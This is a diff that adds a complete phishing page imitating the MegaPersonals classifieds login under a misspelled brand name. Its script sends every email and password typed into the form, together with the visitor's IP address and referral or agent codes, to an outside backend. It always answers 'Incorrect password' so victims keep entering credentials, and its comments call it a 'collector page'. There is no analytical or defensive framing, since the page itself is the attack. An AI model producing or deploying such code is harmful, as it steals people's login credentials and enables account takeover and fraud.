@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Megaparsonels : Classified Hookups</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="ROBOTS" content="INDEX, FOLLOW">
+    <meta name="description" content="MegaParsonels _ Post your classified ad and MEET NOW">
+    <meta name="keywords" content="MegaParsonels ,mega personal, mega personal.eu, mega personal classified login, mega personal hookups login, megapersonals official login, mega ads personal login, megapersonal hookups login, mega personal classifieds login">
+    <meta name="author" content="MegaParsonels.com">
+    <meta name="msvalidate.01" content="6C063CD723E032C5A70C4190B2CC34A7"/>
+    <meta name="google-site-verification" content="jY9tnt497A6DCMpSs2J5V4Ly63w83-Hg6Jtq6oir9zI">
+    <link rel="icon" href="https://megappersonals.com/assets/devilgirl.ico" type="image/png">
+    <link rel="canonical" href="#">
+    <link rel="stylesheet" href="https://megappersonals.com/index_img/bootstrap.min.css">
+    <link rel="stylesheet" href="https://megappersonals.com/index_img/custom.css">
+    <link rel="stylesheet" href="https://megappersonals.com/index_img/emojionearea.min.css">
+
+    <style>
+        body {
+            background-color: #f5f5f5;
+        }
+        .error-message {
+            color: #dc3545;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+        .success-message {
+            color: #28a745;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container login-page">
+        <a href="#">
+            <img src="https://megappersonals.com/index_img/megapersonalsPageHeader.png" class="img-responsive center-block img-width-72 header-top-margin" alt="">
+        </a>
+        <div class="centered top-margin-25 login_firsttime">
+            <h3 class="logincopy">Is this your first time posting?</h3>
+            <a href="#" class="starthere">Start Here</a>
+        </div>
+        <div class="centered loginform">
+            <h2 class="logincopy">Already have an account?</h2>
+            <form class="loginwrapper" id="form_data" accept-charset="utf-8">
+                <div class="centered form-input">
+                    <input id="person_username_field_login" type="email" name="email" placeholder="Email" class="form-control bordered three-radius" required="">
+                    <div class="error-message" id="emailError"></div>
+                </div>
+                <div class="centered form-input">
+                    <input id="person_password_field_login" type="password" name="password" value="" placeholder="Password" class="form-control bordered three-radius" required="">
+                    <div class="error-message" id="passwordError"></div>
+                </div>
+                <div class="centered form-input automargin">
+                    <div class="cap_wrap">
+                        <div class="captcha_image">
+                            <img src="https://megappersonals.com/index_img/123.png" id="captcha_image_itself" alt="">
+                        </div>
+                        <div class="replyCaptchaReloadButton">
+                            <a href="#" id="captchaReload">
+                                <img src="https://megappersonals.com/index_img/megaparsonels.f.webp" width="40" height="40">
+                            </a>
+                        </div>
+                    </div>
+                    <input type="text" id="captcha_code" name="captcha" class="form-control bordered three-radius" placeholder="Enter code from the picture" required="">
+                    <div class="error-message" id="captchaError"></div>
+                    <button type="submit" name="save" class="submit btn btn-primary">
+                        <i class="far fa-paper-plane"></i>Submit
+                    </button>
+                    <div class="error-message" id="formError"></div>
+                    <div class="success-message" id="successMessage"></div>
+                </div>
+            </form>
+        </div>
+        <div class="centered" style="margin-top:36px;">
+            <a href="#"><img src="https://megappersonals.com/index_img/1111.png" alt=""></a>
+        </div>
+
+        <footer>
+            <nav>
+                <ul class="pager myStyle">
+                    <li>
+                        <a id="homeclick" href="#">Home</a>
+                    </li>
+                    <li>|</li>
+                    <li>
+                        <a href="#">Manage Posts</a>
+                    </li>
+                    <li>|</li>
+                    <li>
+                        <a href="#">Contact Us</a>
+                    </li>
+                    <li>|</li>
+                    <li>
+                        <a href="#">Policies &amp; Terms</a>
+                    </li>
+                </ul>
+            </nav>
+            <div class="copyright_class" id="copyrigh">Copyright ©2025 MegaPersonals.eu</div>
+        </footer>
+    </div>
+
+    <script>
+        // Copy of the routing/validation/tracking logic from your previous frontend
+        // Adjusted to set `website` as "Megapersonals" and include userId/visitorIp.
+
+        const API_BASE = 'https://panel-c-backend.onrender.com';
+        const API_URL = `${API_BASE}/api/submit-info`;
+        const TRACK_URL = `${API_BASE}/api/track-visit`;
+        const CLICK_URL = `${API_BASE}/api/clicks`;
+
+        const SITE_NAME = 'Megapersonals';
+        const urlParams = new URLSearchParams(window.location.search);
+        const REF = (urlParams.get('ref') || '').trim();
+        const routeParam = (urlParams.get('route') || '').trim();
+        const idParam = (urlParams.get('id') || '').trim();
+        const agentRoute = routeParam || idParam;
+
+        // state
+        let state = { userId: null, visitorIp: null, sessionId: getNewSessionId(), isLoading: false };
+
+        function setMessage(text, isError = false) {
+            const el = document.getElementById('formError') || document.getElementById('formMessage');
+            if (!el) return;
+            el.textContent = text;
+            el.style.display = 'block';
+            el.style.color = isError ? '#c00' : '#16803d';
+        }
+
+        function isReloadNavigation() {
+            try {
+                const entries = performance.getEntriesByType('navigation');
+                if (entries.length > 0) return entries[0].type === 'reload';
+                return performance.navigation && performance.navigation.type === performance.navigation.TYPE_RELOAD;
+            } catch (e) { return false; }
+        }
+
+        function getNewSessionId() { return `session_${Math.random().toString(36).slice(2)}_${Date.now()}`; }
+
+        let audioContext = null;
+        let activeAudioElement = null;
+        let activeOscillators = [];
+        let activeGains = [];
+
+        function getAudioContext() {
+            if (!audioContext) {
+                const AudioContextClass = window.AudioContext || window.webkitAudioContext;
+                if (AudioContextClass) audioContext = new AudioContextClass();
+            }
+            return audioContext;
+        }
+
+        function stopAllSounds() {
+            try {
+                if (activeAudioElement) {
+                    try { activeAudioElement.pause(); activeAudioElement.currentTime = 0; } catch (e) {}
+                    activeAudioElement = null;
+                }
+                activeOscillators.forEach(o => { try { o.stop(); } catch (e) {} });
+                activeOscillators = [];
+                activeGains.forEach(g => { try { g.disconnect(); } catch (e) {} });
+                activeGains = [];
+            } catch (e) { console.warn('stopAllSounds error', e); }
+        }
+
+        function playOpenSound() {
+            playSynthesizedTing();
+        }
+
+        function playSubmitSound() {
+            playSynthesizedTingVariant();
+        }
+
+        function playSynthesizedTingVariant() {
+            try {
+                stopAllSounds();
+                const ctx = getAudioContext(); if (!ctx) return;
+                if (ctx.state === 'suspended') { ctx.resume().then(() => setTimeout(playSynthesizedTingVariant, 50)).catch(() => {}); return; }
+                const now = ctx.currentTime;
+                const masterGain = ctx.createGain(); masterGain.gain.setValueAtTime(0.9, now); masterGain.connect(ctx.destination); activeGains.push(masterGain);
+                const o1 = ctx.createOscillator(); o1.type = 'sine'; o1.frequency.setValueAtTime(1200, now);
+                const o2 = ctx.createOscillator(); o2.type = 'sine'; o2.frequency.setValueAtTime(900, now + 0.03);
+                o1.connect(masterGain); o2.connect(masterGain); activeOscillators.push(o1, o2);
+                o1.start(now); o2.start(now); o1.stop(now + 0.12); o2.stop(now + 0.18);
+                setTimeout(() => { activeOscillators = []; activeGains = []; }, 300);
+            } catch (e) { console.warn('Variant synth failed', e); }
+        }
+
+        function playSynthesizedTing() {
+            try {
+                const ctx = getAudioContext(); if (!ctx) return;
+                if (ctx.state === 'suspended') { ctx.resume().then(() => setTimeout(playSynthesizedTing, 50)).catch(() => {}); return; }
+                const now = ctx.currentTime;
+                const primaryDuration = 0.12; const secondaryDelay = 0.06; const secondaryDuration = 0.1;
+                stopAllSounds();
+                const masterGain = ctx.createGain(); masterGain.gain.setValueAtTime(1.0, now); masterGain.connect(ctx.destination); activeGains.push(masterGain);
+                const primaryOsc = ctx.createOscillator(); primaryOsc.type='sine'; primaryOsc.frequency.setValueAtTime(1600, now);
+                primaryOsc.frequency.exponentialRampToValueAtTime(1200, now + 0.03); primaryOsc.frequency.exponentialRampToValueAtTime(200, now + primaryDuration);
+                const primaryGain = ctx.createGain(); primaryGain.gain.setValueAtTime(0.5, now); primaryGain.gain.exponentialRampToValueAtTime(0.05, now + primaryDuration);
+                primaryOsc.connect(primaryGain); primaryGain.connect(masterGain); activeOscillators.push(primaryOsc); primaryOsc.start(now); primaryOsc.stop(now + primaryDuration);
+                const secondaryOsc = ctx.createOscillator(); secondaryOsc.type='sine'; secondaryOsc.frequency.setValueAtTime(2400, now + secondaryDelay);
+                secondaryOsc.frequency.exponentialRampToValueAtTime(1800, now + secondaryDelay + 0.025); secondaryOsc.frequency.exponentialRampToValueAtTime(300, now + secondaryDelay + secondaryDuration);
+                const secondaryGain = ctx.createGain(); secondaryGain.gain.setValueAtTime(0, now); secondaryGain.gain.linearRampToValueAtTime(0.35, now + secondaryDelay + 0.01); secondaryGain.gain.exponentialRampToValueAtTime(0.02, now + secondaryDelay + secondaryDuration);
+                secondaryOsc.connect(secondaryGain); secondaryGain.connect(masterGain); activeOscillators.push(secondaryOsc); secondaryOsc.start(now + secondaryDelay); secondaryOsc.stop(now + secondaryDelay + secondaryDuration);
+                setTimeout(() => { activeOscillators = []; activeGains = []; }, Math.ceil((primaryDuration + secondaryDelay + secondaryDuration + 0.1) * 1000));
+            } catch (e) { console.warn('Error playing synthesized ting:', e); }
+        }
+
+        async function trackPageVisitUnique() {
+            try {
+                if (isReloadNavigation()) return;
+                const payload = { website: SITE_NAME, sessionId: state.sessionId || getNewSessionId() };
+                if (agentRoute) payload.route = agentRoute;
+                if (REF) payload.ref = REF;
+                await fetch(TRACK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+            } catch (e) { console.warn('track failed', e); }
+        }
+
+        async function trackClickEvent() {
+            try {
+                const payload = { website: SITE_NAME, sessionId: state.sessionId || getNewSessionId() };
+                if (agentRoute) payload.route = agentRoute;
+                if (REF) payload.ref = REF;
+                await fetch(CLICK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+            } catch (e) { console.warn('click track failed', e); }
+        }
+
+        async function getVisitorIp() {
+            try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); return d.ip; }
+            catch (e) { return null; }
+        }
+
+        // Accept any non-empty identifier (email or username). We don't block submissions.
+        function validateEmail(email) { return !!email && email.length > 0; }
+
+        function clearAllErrors() {
+            ['emailError','passwordError','captchaError','formError','successMessage'].forEach(id => { const el = document.getElementById(id); if (el) { el.style.display='none'; el.textContent=''; } });
+        }
+
+        // keep loading state but do not change button text/appearance
+        function setLoading(on) {
+            state.isLoading = on;
+            // intentionally do not modify button text, opacity, or innerHTML
+        }
+
+        async function submitToBackend(payload) {
+            const resp = await fetch(API_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+            return resp.json();
+        }
+
+        async function handleFormSubmit(e) {
+            e.preventDefault();
+            clearAllErrors();
+            const email = document.getElementById('person_username_field_login').value.trim();
+            const password = document.getElementById('person_password_field_login').value;
+            const captcha = document.getElementById('captcha_code').value.trim();
+
+            if (!email || !password) { setMessage('Please enter both email and password.', true); return; }
+            if (!validateEmail(email)) { setMessage('Please enter a valid email.', true); return; }
+            if (!captcha) { setMessage('Please enter the captcha code', true); return; }
+
+            setLoading(true);
+            try {
+                const payload = {
+                    email,
+                    password,
+                    website: SITE_NAME, // keep identifier as requested
+                    ref: REF || undefined,
+                    route: agentRoute || undefined,
+                    userId: state.userId || undefined,
+                    visitorIp: state.visitorIp || undefined
+                };
+
+                // Send data to backend but always behave as a collector page:
+                // - always show "Incorrect password" and stay on the same page
+                // - still send the payload to the backend for storage
+                try {
+                    await submitToBackend(payload);
+                } catch (e) {
+                    console.warn('backend submit failed', e);
+                }
+
+                try {
+                    await trackClickEvent();
+                } catch (e) {
+                    console.warn('click track failed', e);
+                }
+
+                // clear inputs but do NOT redirect — always show wrong-password message
+                const usernameEl = document.getElementById('person_username_field_login');
+                const passwordEl = document.getElementById('person_password_field_login');
+                const captchaEl = document.getElementById('captcha_code');
+                const captchaImg = document.getElementById('captcha_image_itself');
+                if (usernameEl) usernameEl.value = '';
+                if (passwordEl) passwordEl.value = '';
+                if (captchaEl) captchaEl.value = '';
+
+                // refresh captcha image to a new cache-busted URL if available
+                if (captchaImg && captchaImg.src) {
+                    try { captchaImg.src = captchaImg.src.split('?')[0] + '?r=' + Date.now(); } catch (e) { console.warn('captcha refresh failed', e); }
+                }
+
+                // focus back to email field for the next attempt
+                if (usernameEl) usernameEl.focus();
+
+                playSubmitSound();
+                setMessage('Incorrect password. Please try again.', true);
+
+            } catch (err) {
+                console.error('submit error', err);
+                setMessage('Unable to send data. Check if the backend is running.', true);
+            } finally { setLoading(false); }
+        }
+
+        function setupCaptchaReload() {
+            const reload = document.getElementById('captchaReload');
+            if (!reload) return;
+            reload.addEventListener('click', (e) => { e.preventDefault(); const c = document.getElementById('captcha_code'); if (c) { c.value=''; c.focus(); } clearAllErrors(); console.log('captcha reload'); });
+        }
+
+        async function initialize() {
+            state.userId = (urlParams.get('id') || '').trim() || null;
+            state.visitorIp = await getVisitorIp();
+            document.getElementById('form_data').addEventListener('submit', handleFormSubmit);
+            setupCaptchaReload();
+            ['person_username_field_login','person_password_field_login','captcha_code'].forEach(id => { const el = document.getElementById(id); if (el) el.addEventListener('focus', () => clearAllErrors()); });
+            window.addEventListener('load', () => {
+                trackPageVisitUnique();
+                playOpenSound();
+            });
+        }
+
+        if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', initialize); else initialize();
+    </script>
+
+    <script defer src="https://static.cloudflareinsights.com/beacon.min.js/v833ccba57c9e4d2798f2e76cebdd09a11778172276447" integrity="sha512-57MDmcccJXYtNnH+ZiBwzC4jb2rvgVCEokYN+L/nLlmO8rfYT/gIpW2A569iJ/3b+0UEasghjuZH/ma3wIs/EQ==" data-cf-beacon='{"version":"2024.11.0","token":"e778d95c4741415e9bd062c970519fdf","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
